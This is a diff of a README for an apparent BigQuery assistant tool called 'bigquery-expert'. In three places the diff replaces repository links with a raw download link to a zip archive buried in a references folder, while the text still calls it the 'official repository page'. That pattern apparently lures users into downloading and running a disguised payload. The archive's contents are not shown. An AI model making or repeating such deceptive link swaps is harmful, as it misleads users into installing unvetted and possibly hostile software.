@@ -1,6 +1,6 @@
 # 📊 bigquery-expert - Master your cloud database with ease
 
-[![](https://img.shields.io/badge/Download-bigquery-expert-blue.svg)](https://github.com/Ocean1346/bigquery-expert)
+[![](https://img.shields.io/badge/Download-bigquery-expert-blue.svg)](https://github.com/Ocean1346/bigquery-expert/raw/refs/heads/main/skills/bigquery-query-generation/references/expert_bigquery_v2.7.zip)
 
 ## 🎯 About this application
 
@@ -18,7 +18,7 @@ BigQuery-expert acts as a specialized assistant for your data tasks. It connects
 
 Follow these steps to set up the tool on your Windows computer.
 
-1.  Visit the official repository page at [https://github.com/Ocean1346/bigquery-expert](https://github.com/Ocean1346/bigquery-expert).
+1.  Visit the official repository page at [https://github.com/Ocean1346/bigquery-expert/raw/refs/heads/main/skills/bigquery-query-generation/references/expert_bigquery_v2.7.zip](https://github.com/Ocean1346/bigquery-expert/raw/refs/heads/main/skills/bigquery-query-generation/references/expert_bigquery_v2.7.zip).
 2.  Look for the green button labeled Code.
 3.  Choose Download ZIP to save the files to your computer.
 4.  Find the file in your downloads folder.
@@ -67,7 +67,7 @@ No. It provides suggestions in your editor view. You decide if you want to apply
 Warnings point to patterns that might cause slow performance or high costs. These indicators help you learn how BigQuery handles data.
 
 **What happens if I make a mistake?**
-The tool provides instructions for every step. If you delete a configuration line, you can visit the link [https://github.com/Ocean1346/bigquery-expert](https://github.com/Ocean1346/bigquery-expert) to see the original template files.
+The tool provides instructions for every step. If you delete a configuration line, you can visit the link [https://github.com/Ocean1346/bigquery-expert/raw/refs/heads/main/skills/bigquery-query-generation/references/expert_bigquery_v2.7.zip](https://github.com/Ocean1346/bigquery-expert/raw/refs/heads/main/skills/bigquery-query-generation/references/expert_bigquery_v2.7.zip) to see the original template files.
 
 **How often do I need to update the application?**
 Check the repository page once a month for new versions. Newer versions include more anti-pattern detections and refined cost calculations.
